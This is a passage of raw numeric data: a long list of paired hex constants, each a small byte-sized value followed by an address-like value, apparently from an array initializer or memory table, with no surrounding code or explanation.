0x0000000E, 0x00F0E338, 0x00000005, 0x00F0AD90, 0x0000007D, 0x00F10CA0, 0x0000000E, 0x00F0D758, 0x0000005E, 0x00F11030, 0x00000045, 0x00F0CF40, 0x00000069, 0x00F09790, 0x0000002F, 0x00F095D0, 0x00000065, 0x00F0BF38, 0x0000006A, 0x00F11198, 0x00000034, 0x00F0C408, 0x0000001A, 0x00F10D00, 0x0000006A, 0x00F09BA8, 0x00000047, 0x00F101B8, 0x00000011, 0x00F0B048, 0x00000022, 0x00F09E80, 0x00000060, 0x00F0D498, 0x0000002C, 0x00F12C08, 0x00000067, 0x00F10520, 0x0000005E, 0x00F124E0, 0x00000033, 0x00F0C328, 0x0000004E, 0x00F0E9A0, 0x00000045, 0x00F0FC20, 0x00000050, 0x00F0D640, 0x0000004A, 0x00F0D000, 0x0000003D, 0x00F122B8, 0x0000005E, 0x00F09D90, 0x00000034, 0x00F09CA8, 0x00000001, 0x00F09750, 0x00000010, 0x00F0DD28, 0x0000003B, 0x00F102B8, 0x00000077, 0x00F105F8, 0x0000000F, 0x00F0EC98, 0x0000001E, 0x00F11258, 0x00000005, 0x00F09A38, 0x00000045, 0x00F0DBB8, 0x00000030, 0x00F0D318, 0x00000065, 0x00F0D070, 0x00000061, 0x00F0AD00, 0x0000003C, 0x00F09150, 0x00000052, 0x00F0A648, 0x00000007, 0x00F0D798, 0x0000000E, 0x00F09BF8, 0x00000038, 0x00F11E00, 0x00000074, 0x00F10268, 0x00000069, 0x00F099A8, 0x0000007B, 0x00F0BB60, 0x0000004E, 0x00F0D270, 0x0000001C, 0x00F0B100, 0x0000007D, 0x00F098D8, 0x00000019, 0x00F0CC50, 0x00000051, 0x00F0C1A0, 0x00000070, 0x00F0FB30, 0x0000001B, 0x00F0E1F8, 0x00000042, 0x00F0A980, 0x0000000B, 0x00F0B0F8, 0x00000071, 0x00F0C8D8, 0x00000001, 0x00F0B100, 0x00000044, 0x00F0B390, 0x0000000C, 0x00F0F5C8, 0x00000052, 0x00F0EF18, 0x00000079, 0x00F10940, 0x00000036, 0x00F0A078, 0x00000018, 0x00F0D2A0, 0x00000075, 0x00F10D40, 0x0000001A, 0x00F124F8, 0x00000059, 0x00F0EAB0, 0x0000003E, 0x00F0C990, 0x0000007C, 0x00F0FFC0, 0x00000025, 0x00F0C430, 0x00000050, 0x00F0EC90, 0x00000003, 0x00F0C100, 0x00000009, 0x00F0F8E0, 0x0000000C, 0x00F0CDE8, 0x00000064, 0x00F094D0, 0x0000003B, 0x00F0D3F8, 0x00000017, 0x00F0A0D0, 0x00000007, 0x00F0B6B0, 0x0000007E, 0x00F098D8, 0x0000006A, 0x00F0CD90, 0x00000073, 0x00F0EEE0, 0x00000063, 0x00F103B8, 0x0000005C, 0x00F0C158, 0x0000006B, 0x00F11750, 0x0000006D, 0x00F117F8, 0x00000061, 0x00F104A0, 0x00000079, 0x00F09D00, 0x00000010, 0x00F0F8A8, 0x00000063, 0x00F0EFE8, 0x0000002D, 0x00F10D18, 0x0000003B, 0x00F0AFF0, 0x00000079, 0x00F12150, 0x00000023, 0x00F0DEE0, 0x00000005, 0x00F0A330, 0x0000006A, 0x00F0DBF0, 0x00000006, 0x00F09978, 0x00000044, 0x00F0CAA8, 0x0000007A, 0x00F0A220, 0x00000024, 0x00F0A708, 0x00000066, 0x00F0A560, 0x00000014, 0x00F0B5A8, 0x00000059, 0x00F0ED00, 0x00000033, 0x00F0B048, 0x00000046, 0x00F123A8, 0x0000002D, 0x00F094B8, 0x00000019, 0x00F0DAC8, 0x0000007E, 0x00F0CA40, 0x0000002A, 0x00F0B358, 0x0000003F, 0x00F0C900, 0x0000000E, 0x00F0E2C0, 0x00000035, 0x00F0AE38, 0x00000054, 0x00F0C8E0, 0x00000019, 0x00F09588, 0x00000023, 0x00F0FE30, 0x0000001A, 0x00F0D308, 0x0000005C, 0x00F10FF8, 0x00000035, 0x00F0D1C8, 0x00000036, 0x00F10518, 0x00000061, 0x00F0DDE8, 0x0000005E, 0x00F11D08, 0x00000000, 0x00F0DD48, 0x00000027, 0x00F0AC40, 0x0000004B, 0x00F0BBB8, 0x0000004D, 0x00F0DFD0, 0x0000001D, 0x00F0F570, 0x00000065, 0x00F0D130, 0x0000003B, 0x00F0ADF8, 0x00000061, 0x00F12C40, 0x00000079, 0x00F11ED0, 0x00000046, 0x00F099A0, 0x0000000F, 0x00F0BE08, 0x00000029, 0x00F0AF98, 0x0000004B, 0x00F0AD18, 0x00000054, 0x00F11C68, 0x0000007B, 0x00F10C60, 0x0000003E, 0x00F0AAC0, 0x0000005B, 0x00F09D50, 0x00000057, 0x00F0C9F8, 0x00000027, 0x00F0C598, 0x00000014, 0x00F09AB8, 0x0000005B, 0x00F098A8, 0x00000076, 0x00F118F0, 0x00000038, 0x00F0BAF8, 0x00000065, 0x00F117E0, 0x00000059, 0x00F102B0, 0x0000007C, 0x00F0C338, 0x0000003A, 0x00F0C4D0, 0x0000004F, 0x00F0B388, 0x00000060, 0x00F0B918, 0x0000002E, 0x00F0C228, 0x00000075, 0x00F10BB0, 0x00000070, 0x00F0C9D0, 0x00000029, 0x00F099E0, 0x00000051, 0x00F09FF8, 0x0000007C, 0x00F0D4A0, 0x00000052, 0x00F097C0, 0x00000077, 0x00F0B438, 0x00000054, 0x00F0B980, 0x00000053, 0x00F0EBE8, 0x00000043, 0x00F0E200, 0x00000016, 0x00F11478, 0x00000000, 0x00F0C830, 0x0000003F, 0x00F11128, 0x00000074, 0x00F0A708, 0x0000006C, 0x00F0E788, 0x0000006A, 0x00F0F8A0, 0x00000028, 0x00F10458, 0x00000029, 0x00F0E408, 0x00000035, 0x00F0E330, 0x00000068, 0x00F10D40, 0x00000023, 0x00F0E850, 0x00000005, 0x00F10E80, 0x0000005D, 0x00F09158, 0x00000035, 0x00F09D68, 0x0000001E, 0x00F09918, 0x0000007E, 0x00F0BB18, 0x00000073, 0x00F0A160, 0x00000037, 0x00F0FED0, 0x00000028, 0x00F0DC00, 0x0000006D, 0x00F0C0D0, 0x00000050, 0x00F0DCA8, 0x0000005A, 0x00F09C48, 0x00000058, 0x00F0EBD8, 0x00000044, 0x00F0FDD8, 0x0000003D, 0x00F12B38, 0x00000012, 0x00F0DBC8, 0x00000056, 0x00F112E8, 0x00000054, 0x00F0B6A8, 0x0000005E, 0x00F0AA08, 0x00000001, 0x00F0E620, 0x0000000E, 0x00F0E0B8, 0x00000048, 0x00F0E2E8, 0x0000001D, 0x00F0F8A8, 0x0000002E, 0x00F10510, 0x00000062, 0x00F0BA68, 0x00000035, 0x00F0BB68, 0x0000004E, 0x00F0F578, 0x00000072, 0x00F098E8, 0x0000002E, 0x00F0B9B0, 0x00000045, 0x00F106C0, 0x0000005F, 0x00F0FAC8, 0x00000070, 0x00F12A98, 0x0000003E, 0x00F122E8, 0x0000000D, 0x00F0A3F8, 0x00000035, 0x00F10950, 0x0000003D, 0x00F0A3B0, 0x00000001, 0x00F09398, 0x0000007A, 0x00F0A240, 0x00000027, 0x00F125D0, 0x00000018, 0x00F11AB8, 0x00000049, 0x00F0ECD8, 0x00000069, 0x00F0D888, 0x00000017, 0x00F09478, 0x00000051, 0x00F0B7F8, 0x0000003F, 0x00F11460, 0x00000054, 0x00F0B7C8, 0x00000020, 0x00F0C598, 0x0000004E, 0x00F09C68, 0x00000065, 0x00F0E8D8, 0x00000021, 0x00F0C100, 0x00000004, 0x00F0AEE0, 0x00000020, 0x00F0D3D8, 0x0000003E, 0x00F09EF0, 0x00000010, 0x00F0BE88, 0x0000000E, 0x00F0B818, 0x00000052, 0x00F10D08, 0x0000001C, 0x00F0D3D0, 0x00000058, 0x00F112B8, 0x0000003E, 0x00F0C7A8, 0x0000003E, 0x00F0ECC0, 0x00000008, 0x00F11568, 0x0000004B, 0x00F12270, 0x00000074, 0x00F10B28, 0x00000072, 0x00F0A240, 0x00000040, 0x00F0E428, 0x00000031, 0x00F128E8, 0x00000054, 0x00F0AD40, 0x00000004, 0x00F0B5D0, 0x00000076, 0x00F120C0, 0x00000034, 0x00F10658, 0x00000035, 0x00F0FB00, 0x00000062, 0x00F0D038, 0x00000008, 0x00F12BC8, 0x0000006E, 0x00F0E838, 0x00000043, 0x00F0D148, 0x00000029, 0x00F093B8, 0x00000066, 0x00F09610, 0x00000020, 0x00F0B0B0, 0x00000030, 0x00F11B78, 0x00000067, 0x00F11E98, 0x0000002F, 0x00F10AE0, 0x00000003, 0x00F11388, 0x00000016, 0x00F0FAF0, 0x0000006A, 0x00F0FBE0, 0x00000040, 0x00F10088, 0x00000034, 0x00F0BB20, 0x00000068, 0x00F0B088, 0x00000072, 0x00F10DC8, 0x00000018, 0x00F11390, 0x00000046, 0x00F0EA00, 0x0000000B, 0x00F0E160, 0x00000025, 0x00F0D2E8, 0x0000002A, 0x00F0EFC8, 0x0000007A, 0x00F0B408, 0x00000017, 0x00F0FF48, 0x00000000, 0x00F0DBF8, 0x00000071, 0x00F0FE88, 0x00000005, 0x00F0DC08, 0x00000027, 0x00F0FB38, 0x0000007C, 0x00F12540, 0x0000001A, 0x00F10D48, 0x00000008, 0x00F0BCA0, 0x0000005C, 0x00F0E270, 0x0000005B, 0x00F0B0C8, 0x0000004A, 0x00F116A0, 0x00000025, 0x00F0D650, 0x00000066, 0x00F094A0, 0x00000073, 0x00F0F050, 0x00000005, 0x00F09260, 0x00000023, 0x00F11FC8, 0x0000004E, 0x00F0FD58, 0x00000046, 0x00F09B98, 0x0000006A, 0x00F0A5D0, 0x00000049, 0x00F0ED00, 0x0000004A, 0x00F0CA08, 0x00000011, 0x00F09538, 0x0000006C, 0x00F099C0, 0x00000051, 0x00F09D20, 0x0000002B, 0x00F0BDF8, 0x00000015, 0x00F0B360, 0x0000007E, 0x00F0BEF8, 0x00000070, 0x00F0F2B8, 0x0000000A, 0x00F0ED98, 0x00000079, 0x00F0D3A8, 0x00000012, 0x00F09588, 0x0000000D, 0x00F10398, 0x00000069, 0x00F0ED70, 0x0000004C, 0x00F0BE40, 0x0000001C, 0x00F09B08, 0x00000011, 0x00F0EEE0, 0x00000024, 0x00F0B0B0, 0x0000001D, 0x00F0DFC8, 0x00000006, 0x00F0CF70, 0x00000055, 0x00F0E020, 0x0000005D, 0x00F0D620, 0x00000045, 0x00F0DCE8, 0x0000007B, 0x00F0ACD8, 0x0000003C, 0x00F12CA0, 0x00000011, 0x00F09A38, 0x00000046, 0x00F0F5B8, 0x00000052, 0x00F0C710, 0x00000055, 0x00F092D0, 0x0000005D, 0x00F12B00, 0x0000004B, 0x00F0A6B0, 0x00000011, 0x00F0C6A0, 0x0000003D, 0x00F0EFE8, 0x0000004C, 0x00F0F0A0, 0x00000048, 0x00F10BE8, 0x0000001C, 0x00F12698, 0x00000006, 0x00F10158, 0x0000005A, 0x00F0B2B0, 0x0000003C, 0x00F11E50, 0x00000075, 0x00F11B48, 0x00000040, 0x00F116E0, 0x00000007, 0x00F10850, 0x00000011, 0x00F0D138, 0x00000035, 0x00F11AE8, 0x00000042, 0x00F102A0, 0x0000000A, 0x00F11710, 0x00000024, 0x00F0F5A0, 0x00000004, 0x00F12868, 0x00000062, 0x00F092E0, 0x0000003B, 0x00F105E8, 0x0000005A, 0x00F0D318, 0x0000004E, 0x00F108B8, 0x00000076, 0x00F0E250, 0x00000079, 0x00F0A4D8, 0x00000069, 0x00F09CD8, 0x00000004, 0x00F093F8, 0x0000005F, 0x00F0EFA0, 0x00000054, 0x00F0C590, 0x00000039, 0x00F11EF0, 0x0000000A, 0x00F0C6A0, 0x0000003A, 0x00F12688, 0x00000039, 0x00F11128, 0x0000005D, 0x00F0C258, 0x0000003E, 0x00F0CCD8, 0x00000030, 0x00F10808, 0x0000004E, 0x00F0AA78, 0x00000046, 0x00F0A420, 0x00000024, 0x00F0E4D0, 0x00000069, 0x00F120C0, 0x00000075, 0x00F0B060, 0x0000006A, 0x00F11888, 0x00000028, 0x00F0C0B0, 0x00000023, 0x00F0CF78, 0x00000053, 0x00F0A788, 0x00000040, 0x00F0FD60, 0x0000000C, 0x00F090B0, 0x00000052, 0x00F0F590, 0x0000003C, 0x00F09FB8, 0x0000002A, 0x00F0DCD0, 0x00000076, 0x00F09730, 0x00000006, 0x00F0A318, 0x00000057, 0x00F0A7A0, 0x00000027, 0x00F0CF00, 0x0000000D, 0x00F0A060, 0x00000048, 0x00F0A5B0, 0x00000072, 0x00F09F10, 0x00000008, 0x00F103E0, 0x0000004A, 0x00F0CB70, 0x0000003C, 0x00F0DE18, 0x0000003F, 0x00F12570, 0x00000059, 0x00F11F80, 0x00000061, 0x00F0EB18, 0x00000048, 0x00F0CC78, 0x00000045, 0x00F129D0, 0x00000060, 0x00F0E210, 0x00000048, 0x00F0D068, 0x00000069, 0x00F0E518, 0x00000003, 0x00F12298, 0x0000003F, 0x00F12070, 0x0000005E, 0x00F104F0, 0x00000020, 0x00F0EB18, 0x0000007B, 0x00F0CF18, 0x0000002A, 0x00F0CFD8, 0x0000003B, 0x00F09E00, 0x00000006, 0x00F0E880, 0x00000042, 0x00F0C948, 0x00000059, 0x00F0E3D0, 0x00000011, 0x00F0ED18, 0x0000007E, 0x00F11738, 0x0000003A, 0x00F0BBA0, 0x00000004, 0x00F0BA58, 0x00000038, 0x00F09BD0, 0x00000009, 0x00F0ED40, 0x0000006C, 0x00F124A0, 0x00000078, 0x00F0DF38, 0x0000005B, 0x00F0D430, 0x00000028, 0x00F0D440, 0x00000007, 0x00F0D948, 0x00000066, 0x00F0BDF8, 0x00000038, 0x00F116D0, 0x00000001, 0x00F0BA38, 0x00000065, 0x00F0BB50, 0x00000041, 0x00F0E6D8, 0x00000012, 0x00F0D7B0, 0x00000002, 0x00F09DD8, 0x00000062, 0x00F12778, 0x0000003B, 0x00F0DEE0, 0x0000006E, 0x00F0A9B0, 0x00000037, 0x00F0FE58, 0x00000019, 0x00F0E7B8, 0x00000065, 0x00F10AD8, 0x00000026, 0x00F0A6B0, 0x00000040, 0x00F12868, 0x0000006D, 0x00F0EAD8, 0x00000079, 0x00F0E2F8, 0x00000080, 0x00F0A570, 0x00000054, 0x00F09540, 0x00000022, 0x00F12948, 0x00000036, 0x00F11D98, 0x0000003D, 0x00F0A820, 0x00000002, 0x00F0B950, 0x0000000A, 0x00F12A90, 0x00000055, 0x00F12168, 0x00000017, 0x00F0FB98, 0x00000076, 0x00F0CE18, 0x0000006C, 0x00F0D320, 0x00000043, 0x00F0D388, 0x00000050, 0x00F0E1E0, 0x00000071, 0x00F0B448, 0x00000076, 0x00F0C208, 0x0000004A, 0x00F0CDA0, 0x00000034, 0x00F0D950, 0x00000055, 0x00F0DB90, 0x00000054, 0x00F124F0, 0x00000003, 0x00F11B48, 0x00000054, 0x00F0D5A8, 0x0000005E, 0x00F10DE8, 0x0000006E, 0x00F09160, 0x0000004D, 0x00F102B8, 0x00000015, 0x00F10578, 0x00000068, 0x00F0CE88, 0x0000003F, 0x00F0DF18, 0x0000006F, 0x00F096C8, 0x00000051, 0x00F0A410, 0x00000068, 0x00F12C20, 0x0000004D, 0x00F0D5D0, 0x00000062, 0x00F0E368, 0x00000032, 0x00F0D300, 0x0000007D, 0x00F0E770, 0x00000044, 0x00F0AB08, 0x00000024, 0x00F0CF30, 0x00000005, 0x00F11BC8, 0x00000018, 0x00F0B2D8, 0x0000002B, 0x00F0F578, 0x00000043, 0x00F09490, 0x00000055, 0x00F10AC8, 0x0000005C, 0x00F0F568, 0x00000047, 0x00F0A5A0, 0x0000007A, 0x00F0B7A0, 0x00000008, 0x00F11478, 0x00000000, 0x00F0A9F8, 0x00000005, 0x00F0B380, 0x00000076, 0x00F0E258, 0x0000002A, 0x00F0B878, 0x0000006B, 0x00F0BE98, 0x0000001C, 0x00F0C790, 0x00000034, 0x00F0A8C8, 0x00000061, 0x00F113C0, 0x0000005D, 0x00F11B68, 0x0000004B, 0x00F0FF90, 0x00000000, 0x00F126A8, 0x00000067, 0x00F0C178, 0x00000048, 0x00F112B0, 0x00000027, 0x00F12678, 0x00000013, 0x00F0D010, 0x00000038, 0x00F12050, 0x00000036, 0x00F0CB90, 0x00000019, 0x00F0B1D0, 0x00000065, 0x00F0D3B0, 0x00000063, 0x00F0B1B0, 0x00000068, 0x00F0CC90, 0x00000076, 0x00F09948, 0x0000007B, 0x00F0D758, 0x00000065, 0x00F0AF50, 0x00000000, 0x00F10298, 0x0000003F, 0x00F12568, 0x00000070, 0x00F12548, 0x0000003F, 0x00F0D450, 0x00000046, 0x00F0BFE8, 0x0000006A, 0x00F11DA0, 0x00000015, 0x00F0A110, 0x00000016, 0x00F10028, 0x00000034, 0x00F0DDA8, 0x0000006F, 0x00F0B880, 0x00000033, 0x00F0B568, 0x00000002, 0x00F0F978, 0x0000006A, 0x00F11158, 0x0000004F, 0x00F0EA70, 0x00000069, 0x00F0E2A0, 0x00000072, 0x00F0C440, 0x00000079, 0x00F128E0, 0x0000005B, 0x00F0C0C0, 0x00000033, 0x00F0E7A8, 0x00000038, 0x00F0FD58, 0x00000021, 0x00F0EF08, 0x00000005, 0x00F11420, 0x00000004, 0x00F0B1A8, 0x00000036, 0x00F0B978, 0x00000045, 0x00F0E930, 0x00000053, 0x00F096D0, 0x0000000B, 0x00F12740, 0x0000005A, 0x00F0AC58, 0x00000009, 0x00F0BA28, 0x0000000F, 0x00F0B990, 0x00000012, 0x00F11858, 0x00000053, 0x00F0BCC0, 0x00000071, 0x00F09A08, 0x00000062, 0x00F0B298, 0x00000005, 0x00F0B9D0, 0x0000001C, 0x00F0D440, 0x00000042, 0x00F09798, 0x0000004B, 0x00F11328, 0x00000007, 0x00F0F210, 0x00000015, 0x00F0AA40, 0x00000064, 0x00F11740, 0x00000078, 0x00F09FC0, 0x00000040, 0x00F09288, 0x00000022, 0x00F0D460, 0x00000004, 0x00F0A340, 0x0000007E, 0x00F0E598, 0x00000036, 0x00F0FA80, 0x0000003C, 0x00F0F7E0, 0x00000031, 0x00F0E208, 0x0000007D, 0x00F11678, 0x0000004E, 0x00F0CBC0, 0x00000013, 0x00F0D4D0, 0x00000040, 0x00F09510, 0x00000002, 0x00F0C5C8, 0x00000073, 0x00F09A50, 0x00000020, 0x00F121C0, 0x00000031, 0x00F0BE08, 0x0000007B, 0x00F0B758, 0x00000052, 0x00F0B8E8, 0x0000007D, 0x00F0C2C0, 0x00000044, 0x00F11BF0, 0x00000058, 0x00F10D58, 0x0000003A, 0x00F0E1E0, 0x0000004A, 0x00F0F490, 0x0000002B, 0x00F0F628, 0x0000003A, 0x00F0FC90, 0x00000022, 0x00F10D30, 0x00000033, 0x00F0E090, 0x00000059, 0x00F100F8, 0x00000056, 0x00F0F6F0, 0x00000043, 0x00F123E0, 0x00000020, 0x00F11478, 0x00000071, 0x00F0E2D0, 0x0000005F, 0x00F0FF88, 0x00000064, 0x00F09A38, 0x00000073, 0x00F0D428, 0x0000005E, 0x00F0CF60, 0x00000039, 0x00F0B700, 0x0000002F, 0x00F10B38, 0x0000007C, 0x00F126A0, 0x0000007D, 0x00F098A0, 0x00000013, 0x00F0EBA8, 0x00000037, 0x00F10C28, 0x0000007C, 0x00F0A5F8, 0x00000072, 0x00F0ED10, 0x00000055, 0x00F0CA30, 0x0000001B, 0x00F0CE50, 0x00000050, 0x00F0B168, 0x00000018, 0x00F12C90, 0x00000013, 0x00F0D4D8, 0x00000043, 0x00F0EEE8, 0x00000037, 0x00F12918, 0x0000000B, 0x00F0E928, 0x00000026, 0x00F12520, 0x00000048, 0x00F0E780, 0x00000041, 0x00F121C0, 0x0000006C, 0x00F11938, 0x00000065, 0x00F0FB80, 0x0000006E, 0x00F0F860, 0x00000050, 0x00F0C840, 0x0000001B, 0x00F0A210, 0x0000007B, 0x00F0D978, 0x00000040, 0x00F0A608, 0x0000004D, 0x00F0C5D0, 0x00000038, 0x00F0A488, 0x00000068, 0x00F10A50, 0x00000063, 0x00F0F6B8, 0x00000060, 0x00F0BC58, 0x0000002D, 0x00F0F0B0, 0x00000010, 0x00F0FFE8, 0x00000068, 0x00F0F380, 0x00000068, 0x00F128C0, 0x00000060, 0x00F094B0, 0x00000079, 0x00F0E5A0, 0x0000004F, 0x00F09FE0, 0x0000007E, 0x00F0C4F8, 0x00000068, 0x00F0AEB0, 0x0000002D, 0x00F0A2D8, 0x0000002A, 0x00F0B998, 0x0000001F, 0x00F109F8, 0x00000014, 0x00F0C0C8, 0x0000001A, 0x00F0CB60, 0x00000063, 0x00F11EB0, 0x00000070, 0x00F10C58, 0x0000004A, 0x00F0D350, 0x00000049, 0x00F0ABE8, 0x00000013, 0x00F125F8, 0x0000002F, 0x00F0E418, 0x0000006D, 0x00F0AB80, 0x00000003, 0x00F11C38, 0x0000000C, 0x00F0FDE0, 0x0000003A, 0x00F0B7D8, 0x00000013, 0x00F09B98, 0x0000002E, 0x00F0E5C8, 0x00000072, 0x00F0D740, 0x00000034, 0x00F0D0D0, 0x00000013, 0x00F0DB40, 0x0000004E, 0x00F0BA18, 0x00000005, 0x00F0E690, 0x0000004E, 0x00F128A0, 0x00000017, 0x00F0E3F8, 0x00000013, 0x00F12218, 0x00000077, 0x00F0BD60, 0x00000039, 0x00F0BC08, 0x00000050, 0x00F0F2E8, 0x00000016, 0x00F127D8, 0x0000007B, 0x00F0F8A8, 0x00000022, 0x00F0BEA0, 0x00000046, 0x00F0FA98, 0x00000038, 0x00F098C0, 0x0000005A, 0x00F0A078, 0x00000063, 0x00F0DA20, 0x00000043, 0x00F10A30, 0x00000011, 0x00F10968, 0x00000035, 0x00F0EA90, 0x0000004F, 0x00F0CFB8, 0x0000006D, 0x00F10A28, 0x00000011, 0x00F106F8, 0x0000006C, 0x00F0D278, 0x00000010, 0x00F10A10, 0x0000006E, 0x00F0C9B0, 0x00000034, 0x00F103F0, 0x00000021, 0x00F092F0, 0x00000039, 0x00F11A90, 0x0000004F, 0x00F0BB50, 0x0000005E, 0x00F0D5D0, 0x0000004D, 0x00F11648, 0x0000006E, 0x00F09E70, 0x0000005E, 0x00F0F860, 0x00000054, 0x00F126E0, 0x00000009, 0x00F0EA78, 0x0000002A, 0x00F0A410, 0x0000004C, 0x00F0F6E8, 0x00000052, 0x00F111C0, 0x00000071, 0x00F09E08, 0x00000026, 0x00F0BC30, 0x0000004E, 0x00F0B218, 0x00000046, 0x00F0D950, 0x00000023, 0x00F10D80, 0x0000006D, 0x00F0D668, 0x0000007E, 0x00F09170, 0x00000027, 0x00F0B8F0, 0x0000005B, 0x00F0E1A8, 0x00000078, 0x00F12730, 0x00000044, 0x00F0EB48, 0x00000076, 0x00F11470, 0x0000003D, 0x00F09AC0, 0x0000007D, 0x00F125F0, 0x0000005F, 0x00F0C0F8, 0x0000004E, 0x00F0A8C0, 0x0000002B, 0x00F0CBD0, 0x00000059, 0x00F09728, 0x00000028, 0x00F0D658, 0x00000019, 0x00F10EB0, 0x00000051, 0x00F0D658, 0x00000015, 0x00F12A28, 0x0000006D, 0x00F0B100, 0x0000007C, 0x00F12B20, 0x00000044, 0x00F0ED20, 0x00000015, 0x00F09430, 0x00000078, 0x00F12430, 0x0000003B, 0x00F10168, 0x00000034, 0x00F0DD30, 0x00000056, 0x00F0AC60, 0x00000076, 0x00F0AFD0, 0x0000005F, 0x00F097F0, 0x00000068, 0x00F12B08, 0x00000069, 0x00F0D638, 0x00000055, 0x00F116B8, 0x00000068, 0x00F0B9D0, 0x00000027, 0x00F0D1F0, 0x0000006B, 0x00F09910, 0x0000007D, 0x00F103F0, 0x0000002E, 0x00F0C0E0, 0x0000002B, 0x00F0B348, 0x00000037, 0x00F0F668, 0x0000002E, 0x00F0AA58, 0x0000004F, 0x00F10480, 0x0000007E, 0x00F0B380, 0x00000025, 0x00F0F418, 0x0000000E, 0x00F0C3B8, 0x0000004F, 0x00F0A018, 0x00000023, 0x00F0E378, 0x00000005, 0x00F12B20, 0x0000005A, 0x00F0FB78, 0x00000054, 0x00F0E1A8, 0x00000043, 0x00F0A108, 0x00000019, 0x00F0C660, 0x0000003E, 0x00F12618, 0x00000077, 0x00F10370, 0x0000004C, 0x00F0AD50, 0x0000003F, 0x00F0C810, 0x0000003D, 0x00F0E0F8, 0x00000044, 0x00F0C578, 0x0000004E, 0x00F0A338, 0x00000041, 0x00F10510, 0x00000045, 0x00F0A230, 0x0000004B, 0x00F0D0A8, 0x00000073, 0x00F0D598, 0x0000003C, 0x00F0AD60, 0x00000061, 0x00F09410, 0x00000063, 0x00F0C188, 0x0000006F, 0x00F0BB30, 0x00000024, 0x00F0E658, 0x00000010, 0x00F0F4A8, 0x0000007A, 0x00F10358, 0x0000002B, 0x00F10C08, 0x00000074, 0x00F0F678, 0x00000022, 0x00F0B8D8, 0x00000018, 0x00F10C10, 0x00000003, 0x00F0E0D8, 0x0000006D, 0x00F0A718, 0x00000066, 0x00F0E1E8, 0x00000067, 0x00F0A8A8, 0x00000026, 0x00F10570, 0x0000000B, 0x00F0A1B8, 0x00000040, 0x00F0F200, 0x00000005, 0x00F0E9A8, 0x0000001A, 0x00F0BB58, 0x00000009, 0x00F09678, 0x0000000C, 0x00F12720, 0x00000042, 0x00F0E048, 0x0000005A, 0x00F0D390, 0x00000005, 0x00F10358, 0x00000009, 0x00F09CB0, 0x0000002E, 0x00F0B2C8, 0x0000001B, 0x00F0A2D8, 0x00000050, 0x00F11168, 0x00000061, 0x00F0AAB8, 0x00000026, 0x00F09218, 0x00000026, 0x00F0CF80, 0x00000056, 0x00F0E170, 0x00000070, 0x00F11B90, 0x00000012, 0x00F09948, 0x0000005D, 0x00F11340, 0x00000022, 0x00F0AEC8, 0x0000007D, 0x00F10610, 0x0000003E, 0x00F0E748, 0x00000061, 0x00F0FBF0, 0x0000000B, 0x00F0C8F0, 0x0000003C, 0x00F0C0C8, 0x00000052, 0x00F0ECA0, 0x00000049, 0x00F0B438, 0x0000007E, 0x00F09180, 0x00000054, 0x00F0F4D0, 0x00000067, 0x00F12440, 0x0000000B, 0x00F0BD80, 0x00000065, 0x00F0F138, 0x00000016, 0x00F129C0, 0x0000004A, 0x00F111B0, 0x00000079, 0x00F0F0F0, 0x00000032, 0x00F0E178, 0x00000050, 0x00F121A8, 0x0000004A, 0x00F0C158, 0x00000064, 0x00F10460, 0x00000001, 0x00F10580, 0x00000036, 0x00F11220, 0x00000039, 0x00F0EE98, 0x0000005E, 0x00F127C8, 0x0000006E, 0x00F0DAA0, 0x0000007B, 0x00F0D178, 0x0000007D, 0x00F10910, 0x00000014, 0x00F10830, 0x0000006E, 0x00F104E0, 0x0000007D, 0x00F0B948, 0x00000056, 0x00F0C4D0, 0x00000057, 0x00F0C060, 0x00000069, 0x00F12898, 0x00000019, 0x00F11328, 0x00000029, 0x00F126C0, 0x0000003C, 0x00F0A6A8, 0x00000052, 0x00F0C608, 0x00000017, 0x00F122F0, 0x0000007E, 0x00F0D8B0, 0x00000058, 0x00F0DD30, 0x00000000, 0x00F0EB48, 0x00000044, 0x00F111A8, 0x00000020, 0x00F0EC90, 0x00000027, 0x00F0EA60, 0x0000000C, 0x00F11D18, 0x00000019, 0x00F10530, 0x00000046, 0x00F0D3B0, 0x00000006, 0x00F12818, 0x00000059, 0x00F10558, 0x00000015, 0x00F10E98, 0x00000004, 0x00F0E270, 0x0000005E, 0x00F12040, 0x0000004B, 0x00F0EE48, 0x00000024, 0x00F094B8, 0x00000028, 0x00F0D6B0, 0x0000005B, 0x00F10948, 0x0000007E, 0x00F0B6B8, 0x0000003C, 0x00F12820, 0x00000066, 0x00F0C608, 0x00000051, 0x00F096F8, 0x0000003E, 0x00F0E630, 0x00000006, 0x00F10838, 0x00000014, 0x00F09650, 0x00000042, 0x00F0A8D8, 0x00000004, 0x00F0EDC8, 0x0000002A, 0x00F0DC70, 0x0000006B, 0x00F0C178, 0x00000071, 0x00F09630, 0x00000026, 0x00F0A000, 0x00000064, 0x00F0B6A0, 0x0000001E, 0x00F0D788, 0x00000035, 0x00F12240, 0x0000001C, 0x00F0CE70, 0x00000022, 0x00F0DCB0, 0x0000005E, 0x00F0B9F0, 0x0000004C, 0x00F0C150, 0x00000073, 0x00F10118, 0x00000006, 0x00F0BF10, 0x0000001A, 0x00F0B6F8, 0x00000065, 0x00F11BD8, 0x0000004A, 0x00F10360, 0x00000066, 0x00F10178, 0x0000005C, 0x00F0A710, 0x0000003C, 0x00F0DC78, 0x0000007C, 0x00F11970, 0x0000002E, 0x00F0C148, 0x00000038, 0x00F12C80, 0x00000057, 0x00F0D8D8, 0x00000070, 0x00F0AEF0, 0x00000054, 0x00F11A88, 0x00000070, 0x00F12AC0, 0x00000074, 0x00F09318, 0x00000000, 0x00F0A360, 0x00000005, 0x00F0D210, 0x00000025, 0x00F0B318, 0x0000007E, 0x00F0EB60, 0x0000007A, 0x00F0DE18, 0x00000000, 0x00F0D930, 0x00000037, 0x00F0C7F0, 0x00000034, 0x00F0E390, 0x00000058, 0x00F0F4D8, 0x00000003, 0x00F10890, 0x00000031, 0x00F0D5E0, 0x00000061, 0x00F0B498, 0x0000007C, 0x00F0FE80, 0x0000005B, 0x00F0B0E8, 0x00000074, 0x00F0D388, 0x00000052, 0x00F0CA90, 0x0000001C, 0x00F0D940, 0x00000016, 0x00F0E1A8, 0x00000065, 0x00F12838, 0x0000003C, 0x00F0B268, 0x0000004B, 0x00F0D5C0, 0x00000053, 0x00F09CD0, 0x00000044, 0x00F0D668, 0x00000071, 0x00F0A500, 0x0000002B, 0x00F0B400, 0x00000033, 0x00F0CD48, 0x0000002D, 0x00F0F758, 0x00000018, 0x00F0A640, 0x00000028, 0x00F0B210, 0x0000006B, 0x00F0CB18, 0x0000002B, 0x00F11E40, 0x00000012, 0x00F11740, 0x00000068, 0x00F09678, 0x00000076, 0x00F104E0, 0x00000071, 